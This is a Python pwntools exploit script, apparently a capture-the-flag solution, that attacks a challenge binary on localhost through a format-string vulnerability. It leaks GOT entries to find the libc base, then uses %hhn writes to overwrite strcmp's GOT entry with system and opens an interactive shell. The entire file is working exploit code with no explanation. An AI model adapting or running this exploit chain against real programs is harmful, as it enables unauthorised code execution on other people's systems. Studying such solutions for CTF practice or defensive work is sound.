#!/usr/bin/env python3
from pwn import *

libc = ELF("libc-2.31.so")
chall = ELF("chall")
print(chall.got)

'''
Arch:     amd64-64-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
'''

r = remote("localhost", 7878)

r.readline()
r.readline()

def leak(addr):
    '''
    addr: a string representing the address to leak
    returns: a 64 bit int representing the value at addr
    '''
    r.readline()
    payload = b"%109$s"
    assert len(payload) < 800
    payload = payload.ljust(800, b"\x00")
    r.sendline(payload + b"AAAAAAAA" + addr)
    r.readuntil("ng: ")
    return u64(r.readline()[:-1].ljust(8, b"\x00"))

def write(addr, val):
    '''
    addr: an integer representing the address to write to
    val: an string representing the value to write
    '''
    r.readline()
    payload = b""
    count = 0
    for i in range(8):
        x = (val[i] - count + 256) % 256
        x = x if x else 256
        payload += b"%%%dx%%%d$hhn" % (x, 109 + i)
        count = val[i]

    assert len(payload) < 800
    payload = payload.ljust(800, b"\x00")
    r.sendline(payload + b"AAAAAAAA" + b"".join([p64(addr + i) for i in range(8)]))

'''
# to find the right offset
payload = ''.join([(" %%%d$p" % i) for i in range(108, 113)])
assert len(payload) < 800
payload = payload.ljust(800, "\x00")
r.sendline(payload + "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFFGGGGGGGG")
'''

aname = 'printf'
bname = 'puts'

a = leak(p64(chall.got[aname]))
b = leak(p64(chall.got[bname]))
print(hex(a))
print(hex(b))
print(hex(a - b))
print(hex(libc.symbols[aname] - libc.symbols[bname]))
assert a - b == libc.symbols[aname] - libc.symbols[bname]

systemaddr = a - (libc.symbols[aname] - libc.symbols["system"])
print("system:", hex(systemaddr))

write(chall.got['strcmp'], p64(systemaddr))

r.interactive()
